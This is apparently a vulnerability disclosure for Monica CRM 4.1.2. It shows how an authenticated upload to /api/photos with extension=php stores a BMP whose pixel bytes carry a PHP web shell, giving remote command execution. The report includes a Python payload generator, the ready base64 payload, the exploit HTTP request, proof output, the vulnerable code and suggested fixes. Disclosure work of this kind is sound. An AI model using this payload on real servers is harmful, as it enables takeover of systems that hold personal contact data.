### Vulnerability details

**Official website / Product:** https://www.monicahq.com/ / https://github.com/monicahq/monica

**Repository:** monicahq/monica (stars at selection: 25558)

**Vulnerability type:** file_upload → getshell / RCE

**Vulnerability versions:** 4.1.2 (Docker `monica:4.1.2-apache`; 4.x stable line). Default-branch main / v5 beta routes uploads through Uploadcare; this local sink is absent there.

**Vulnerability URL / Parameter:** `POST /api/photos` parameters `data` (BMP image) + `extension=php`; equivalent trigger: vCard import `PHOTO` + `TYPE=php` → `UploadPhoto::importFile`

**Complex:** yes

### Verification procedure

1. Bring up official image `monica:4.1.2-apache` + MySQL 8 with the `docker-compose.yml` below, host port **18302→80**. Image digest: `sha256:11830fa6335965c3e613eb16cb5c7755f4cf25bdb59806f5f782378651d372a3`. Audited code: tag **v4.1.2** / commit `32028ce3ce79cef38df5d27a297e5b20680f0065`.

```yaml
services:
  db:
    image: mysql:8.0
    environment:
      MYSQL_RANDOM_ROOT_PASSWORD: "true"
      MYSQL_DATABASE: monica
      MYSQL_USER: monica
      MYSQL_PASSWORD: secret
    volumes:
      - monica_db:/var/lib/mysql
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "127.0.0.1", "-umonica", "-psecret"]
      interval: 5s
      timeout: 5s
      retries: 30
  app:
    image: monica:4.1.2-apache
    depends_on:
      db:
        condition: service_healthy
    ports:
      - "18302:80"
    environment:
      APP_KEY: base64:2fl+Ktvkdu+F8fIkJKrkCWdi/FaedYVdFwtKsUK6m7w=
      DB_HOST: db
      DB_USERNAME: monica
      DB_PASSWORD: secret
      APP_ENV: local
      APP_DEBUG: "true"
      APP_URL: http://127.0.0.1:18302
    volumes:
      - monica_data:/var/www/html/storage
volumes:
  monica_db:
  monica_data:
```

Expected `docker compose ps` after start:

```
NAME           IMAGE                 SERVICE   STATUS                   PORTS
docker-app-1   monica:4.1.2-apache   app       Up                       0.0.0.0:18302->80/tcp
docker-db-1    mysql:8.0             db        Up (healthy)             3306/tcp
```

App init runs `artisan storage:link`, linking `public/storage` → `storage/app/public`.

2. Open http://127.0.0.1:18302/, register and log in (PoC account: `r3a2@test.local` / `Password123!`), create a contact (PoC `contact_id` = `1`).
3. In Settings → API create a Passport Personal Access Token (PAT); subsequent requests use `Authorization: Bearer <PAT>`.
4. Craft a 24-bit BMP (width 30, height 1, 24bpp) whose contiguous BGR pixel bytes spell  
   `<?php echo "PWNED_".php_uname(); if(isset($_GET["c"])){echo "\n"; system($_GET["c"]);} ?> `  
   (trailing space, then `\x00\x00` pad so the row is 92 bytes). Survives Intervention `stream('bmp')`. Generate with the Python below, or use the full base64 already embedded in the step-5 request body:

```python
import struct, base64
php = b'<?php echo "PWNED_".php_uname(); if(isset($_GET["c"])){echo "\\n"; system($_GET["c"]);} ?> '
row = php + b'\x00\x00'  # 90 payload + 2 pad = 92
assert len(row) == 92
hdr = struct.pack('<2sIHHI', b'BM', 54 + len(row), 0, 0, 54)
dib = struct.pack('<IiiHHIIiiII', 40, 30, 1, 1, 24, 0, len(row), 0, 0, 0, 0)
open('crafted.bmp', 'wb').write(hdr + dib + row)
print(base64.b64encode(hdr + dib + row).decode())
# Qk2SAAAAAAAAADYAAAAoAAAAHgAAAAEAAAABABgAAAAAAFwAAAAAAAAAAAAAAAAAAAAAAAAAPD9waHAgZWNobyAiUFdORURfIi5waHBfdW5hbWUoKTsgaWYoaXNzZXQoJF9HRVRbImMiXSkpe2VjaG8gIlxuIjsgc3lzdGVtKCRfR0VUWyJjIl0pO30gPz4gAAA=
```

5. `POST /api/photos` with JSON: `contact_id`, `data=data:image/bmp;base64,<crafted.bmp>`, `extension=php`.
6. Response HTTP 201; `new_filename` is `photos/<rand>.php` (default `public` disk → `storage/app/public`, web-reachable via `public/storage` symlink).
7. Request `http://127.0.0.1:18302/storage/photos/<rand>.php?c=id` → `PWNED_Linux ...` and `uid=33(www-data)`.

Vulnerability HTTP request:

```http
POST /api/photos HTTP/1.1
Host: 127.0.0.1:18302
Authorization: Bearer <PAT>
Accept: application/json
Content-Type: application/json

{
  "contact_id": 1,
  "data": "data:image/bmp;base64,Qk2SAAAAAAAAADYAAAAoAAAAHgAAAAEAAAABABgAAAAAAFwAAAAAAAAAAAAAAAAAAAAAAAAAPD9waHAgZWNobyAiUFdORURfIi5waHBfdW5hbWUoKTsgaWYoaXNzZXQoJF9HRVRbImMiXSkpe2VjaG8gIlxuIjsgc3lzdGVtKCRfR0VUWyJjIl0pO30gPz4gAAA=",
  "extension": "php"
}
```

Upload response (proves `.php` write):

```http
HTTP/1.1 201 Created
Content-Type: application/json

{"data":{"id":24,"uuid":"cb783ee9-e9ae-4335-986c-2acf217070ca","object":"photo","original_filename":"WQy6oZG0ejxmVE9taGbpgQ2Cd2k3DOUCQK650h2w.php","new_filename":"photos\/WQy6oZG0ejxmVE9taGbpgQ2Cd2k3DOUCQK650h2w.php","filesize":146,"mime_type":"image\/x-ms-bmp","link":"http:\/\/127.0.0.1:18302\/store\/photos\/WQy6oZG0ejxmVE9taGbpgQ2Cd2k3DOUCQK650h2w.php","account":{"id":1},"contact":{"id":1}}}
```

RCE verification request:

```http
GET /storage/photos/WQy6oZG0ejxmVE9taGbpgQ2Cd2k3DOUCQK650h2w.php?c=id HTTP/1.1
Host: 127.0.0.1:18302
```

```
HTTP/1.1 200 OK

PWNED_Linux 26e27ba08320 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18) x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Verification result:

Upload returned HTTP 201; `new_filename` ends in `.php`. Request to `/storage/photos/...php?c=id` printed:

```
PWNED_Linux 26e27ba08320 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18) x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Vulnerability analysis

`App\Services\Account\Photo\UploadPhoto::importFile` loads `data` via Intervention Image, then asks Mimey for an extension from `$image->mime()`. For BMP the mime is `image/x-ms-bmp`; Mimey has **no mapping** (empty string), so the code falls back to request parameter `extension` (only spaces stripped — no allowlist). The file is stored on the default `public` disk as `photos/<rand>.php`. The official Apache image exposes that path via the `public/storage` symlink, and `.php` is executed by the PHP engine. The attacker embeds PHP source in BMP pixel bytes; after re-stream the `<?php` sequence remains, yielding getshell.

The same sink is reachable via vCard `PHOTO` + `TYPE` (written into `extension`) during import.

Vulnerable trigger / sink source (complete path and line numbers):

```php
# File: app/Services/Account/Photo/UploadPhoto.php
# Lines: 101-132
    private function importFile(array $data): ?array
    {
        $filename = Str::random(40);

        try {
            $image = Image::make($data['data']);
        } catch (NotReadableException $e) {
            return null;
        }

        $tempfile = $this->storeImage('local', $image, 'temp/'.$filename);

        try {
            $storagePath = StorageHelper::disk('local')->path($tempfile);
            $image = $image->setFileInfoFromPath($storagePath);
            $extension = (new \Mimey\MimeTypes)->getExtension($image->mime());
            if (empty($extension)) {
                $extension = str_replace(' ', '', Arr::get($data, 'extension'));
            }
            if (! empty($extension)) {
                $filename .= '.'.$extension;
            }
            // ...
            $array['new_filename'] = $this->storeImage(config('filesystems.default'), $image, 'photos/'.$filename);
```

### Vulnerability Fix

1. Strict allowlist for `extension` (e.g. jpg/jpeg/png/gif/webp); ban `php`/`phtml`/`phar`; normalize paths and reject `../`.
2. Complete Mimey mappings for `image/x-ms-bmp` (and similar), or always derive extension server-side and ignore client `extension`.
3. Disable PHP execution under user-upload trees (`php_flag`/`RemoveHandler` under `public/storage`, or non-webroot storage + controlled download).
4. Re-encode before store and strip non-image content; never concatenate attacker-controlled extensions into a web-reachable path.
